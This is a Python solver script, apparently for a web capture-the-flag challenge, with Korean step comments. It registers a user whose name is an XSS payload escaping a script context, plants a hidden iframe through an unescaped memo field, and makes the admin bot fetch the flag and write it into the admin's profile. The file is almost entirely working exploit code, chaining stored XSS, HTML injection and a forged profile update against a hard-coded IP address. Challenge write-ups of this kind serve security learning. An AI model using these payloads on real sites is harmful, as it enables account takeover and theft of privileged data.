import requests, re, time

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, bot_url: str, prefix: str) -> str:
    with requests.Session() as ses:
        # 1. XSS payload username으로 회원가입
        #    profile.html의 [(${profileUser.username})] → <script nonce> 안에서 실행
        xss_username = (
            '");'
            'fetch("http://127.0.0.1:8080/admin/flag")'
            '.then(r=>r.json())'
            '.then(d=>fetch("/profile/update/1",{'
            'method:"POST",'
            'headers:{"Content-Type":"application/x-www-form-urlencoded"},'
            'body:"email="+encodeURIComponent(d.flag)'
            '}));'
            '//'
        )
        ses.post(f"{url}register", data={
            "username": xss_username,
            "email": "attacker@evil.com",
            "password": "Password123!"
        })

        # 2. 로그인 후 user ID 확인
        r = ses.post(f"{url}login", data={
            "usernameOrEmail": "attacker@evil.com",
            "password": "Password123!"
        }, allow_redirects=True)
        my_id = re.search(r'/profile/(\d+)', r.url).group(1)

        # 3. top memo 생성
        r_top = ses.post(f"{url}api/memo", json={
            "title": "top", "content": "top", "parentId": None
        })
        top_id = r_top.json()["id"]

        # 4. child memo 생성 (content에 iframe injection → memo.html의 th:utext로 렌더링)
        iframe_payload = f'<iframe src="/profile/{my_id}" style="display:none"></iframe>'
        r_child = ses.post(f"{url}api/memo", json={
            "title": "child", "content": iframe_payload, "parentId": top_id
        })
        child_id = r_child.json()["id"]

        # 5. bot에게 child memo 방문 요청 (UUID/UUID 형식)
        requests.post(f"{bot_url}visit", data={"path": f"{top_id}/{child_id}"})
        time.sleep(5)

        # 6. admin(id=1) profile에서 flag 읽기 (email 필드에 저장됨)
        flag = get_flag(ses.get(f"{url}profile/1").text, prefix)
    return flag

if __name__ == "__main__":
    url = "http://43.200.44.36:8080/"
    bot_url = "http://43.200.44.36:3000/"
    prefix = "ENKI"
    print(solution(url, bot_url, prefix))